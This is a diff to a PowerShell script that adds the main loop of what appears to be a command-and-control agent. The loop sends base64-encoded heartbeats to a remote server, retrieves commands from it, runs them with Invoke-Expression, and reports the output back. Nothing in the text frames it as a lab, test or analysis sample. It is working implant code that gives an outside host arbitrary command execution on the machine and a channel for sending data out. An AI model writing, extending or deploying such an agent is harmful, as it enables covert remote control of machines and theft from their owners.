@@ -110,3 +110,87 @@ if ($responseContent -like "Heartbeat registered*") {
     Write-Host "[X] ERROR response: " + $responseContent
 }
 Write-Host "[OK] Agent setup completed!"
+
+###### 5. Run in loop
+Write-Host "[.] Running main Loop"
+
+$commandCompleted = $false
+
+while($true){
+    Start-Sleep -Seconds $agentSleeptime
+    Write-Host "[.] Slept $agentSleeptime seconds."
+    
+    if ($commandCompleted){
+        # Report results in heartbeat
+        # Complex Heartbeat
+
+        $EncodedCommandResult = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($commandResult))
+
+$heartbeatJSON = @"
+{"id":$agentID,"uuid":"$commandUUID","result":"$EncodedCommandResult"}
+"@
+        $EncodedheartbeatJSON = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($heartbeatJSON))
+
+        $simpleheartbeatURL = $heartbeatURL + "?heartbeat=" + $EncodedheartbeatJSON
+
+        $response = Invoke-WebRequest -Uri $simpleheartbeatURL -UseBasicParsing
+        $responseContent = $response.Content
+
+        # Extract the matched number and print it
+        if ($responseContent -like "Heartbeat and command result registered*") {
+            Write-Host "[.] Completed complex heartbeat"
+            # Ready to retrieve next command
+            $commandCompleted = $false
+        } else {
+            Write-Host "[X] ERROR response: " + $responseContent
+        }
+    }
+    else{
+        # Do simple heartbeat and check for new command
+        # Simple Heartbeat
+$heartbeatJSON = @"
+{"id":$agentID}
+"@
+        $EncodedheartbeatJSON = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($heartbeatJSON))
+
+        $simpleheartbeatURL = $heartbeatURL + "?heartbeat=" + $EncodedheartbeatJSON
+
+        $response = Invoke-WebRequest -Uri $simpleheartbeatURL -UseBasicParsing
+        $responseContent = $response.Content
+
+        # Extract the matched number and print it
+        if ($responseContent -like "Heartbeat registered*") {
+            Write-Host "[.] Completed simple heartbeat"
+        } else {
+            Write-Host "[X] ERROR response: " + $responseContent
+        }
+
+        # Check for new command
+
+        $fullgetcommandurl = $getcommandURL + "?id=" + $agentID
+        $response = Invoke-WebRequest -Uri $fullgetcommandurl -UseBasicParsing
+        $responseContent = $response.Content
+
+        # Use a regular expression to match the ID number in the response
+        $regex = "\[\('(?<f>.*)', '(?<s>.*)'\)\]"
+        $matches = [regex]::matches($responseContent, $regex)
+
+        # Extract the matched number and print it
+        if ($matches.Count -gt 0) {
+            $commandUUID = $matches[0].groups["f"].Value
+            $commandText = $matches[0].groups["s"].Value
+            Write-Host "[.] Retrieved command: $commandText with ID: $commandUUID"
+
+            # Execute command
+
+            $commandResult = Invoke-Expression $commandText
+            $commandCompleted = $true
+            Write-Host "[.] Command executed with output: $commandResult"
+
+        } else {
+            Write-Host "[.] Error or no new command: $response"
+        }
+
+
+    }
+}
